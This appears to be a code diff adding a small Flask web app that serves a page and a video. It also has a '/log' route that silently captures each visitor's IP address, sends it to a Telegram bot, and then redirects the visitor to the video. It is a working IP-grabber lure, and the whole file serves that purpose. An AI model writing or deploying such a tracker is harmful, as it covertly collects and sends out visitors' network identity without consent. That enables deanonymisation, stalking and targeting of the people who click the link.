@@ -1,0 +1,24 @@
+from flask import Flask, request, send_from_directory, redirect
+import requests, os
+
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return send_from_directory('.', 'index.html')
+
+@app.route('/video.mp4')
+def video():
+    return send_from_directory('.', 'video.mp4')
+
+@app.route('/log')
+def log_ip():
+    ip = request.remote_addr
+    # إرسال رسالة Telegram
+    msg = f"🛡️ IP زائر: {ip}"
+    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                 params={"chat_id": CHAT_ID, "text": msg})
+    return redirect('/video.mp4')
